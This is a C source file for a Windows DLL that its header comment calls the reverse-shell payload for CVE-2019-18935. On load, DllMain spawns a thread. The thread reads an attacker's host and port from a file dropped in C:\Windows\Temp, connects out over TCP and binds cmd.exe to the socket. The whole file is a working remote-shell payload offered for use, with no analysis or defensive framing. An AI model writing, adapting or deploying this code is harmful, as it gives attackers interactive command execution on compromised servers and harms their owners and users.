#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ws2_32")

/*
 * revshell.c — CVE-2019-18935 payload: reverse shell.
 *
 * IMPORTANT: getenv("REV_HOST") reads the *target's* environment, which is
 * almost never set, so a single compiled DLL used to always dial 127.0.0.1.
 * The C2 is now read from C:\Windows\Temp\rev.txt (one line: "host:port"),
 * which run.sh drops with the upload primitive. Env vars still work as a
 * fallback, then 127.0.0.1:4444.
 */

#define CFG "C:\\Windows\\Temp\\rev.txt"

static void GetC2(const char **host, int *port)
{
    static char hbuf[256];
    char pbuf[16] = "4444";
    const char *h = NULL, *p = NULL;
    FILE *f = fopen(CFG, "rb");

    if (f) {
        char line[300], *colon;
        if (fgets(line, sizeof(line), f)) {
            line[strcspn(line, "\r\n")] = 0;
            colon = strrchr(line, ':');
            if (colon) {
                *colon = 0;
                strncpy(pbuf, colon + 1, sizeof(pbuf) - 1);
                h = line;
            } else if (line[0]) {
                h = line;                 /* port left at default */
            }
        }
        fclose(f);
        if (h) strncpy(hbuf, h, sizeof(hbuf) - 1);
    }

    if (!hbuf[0]) {
        h = getenv("REV_HOST");
        p = getenv("REV_PORT");
        if (h && *h) strncpy(hbuf, h, sizeof(hbuf) - 1);
        else strcpy(hbuf, "127.0.0.1");
        if (p && *p) strncpy(pbuf, p, sizeof(pbuf) - 1);
    }

    *host = hbuf;
    *port = atoi(pbuf);
}

static SOCKET Winsock;
static struct sockaddr_in hax;

static void ReverseShell(void)
{
    const char *host;
    int port;
    struct hostent *he;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    WSADATA wsa;

    GetC2(&host, &port);
    if (port <= 0 || port > 65535) port = 4444;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    he = gethostbyname(host);
    if (!he || !he->h_addr) return;

    hax.sin_family = AF_INET;
    hax.sin_port = htons((unsigned short)port);
    memcpy(&hax.sin_addr, he->h_addr, 4);

    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (WSAConnect(Winsock, (SOCKADDR *)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
        return;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)Winsock;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}

static DWORD WINAPI MainThread(LPVOID lpParam)
{
    (void)lpParam;
    ReverseShell();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    HANDLE hThread;
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        hThread = CreateThread(0, 0, MainThread, 0, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
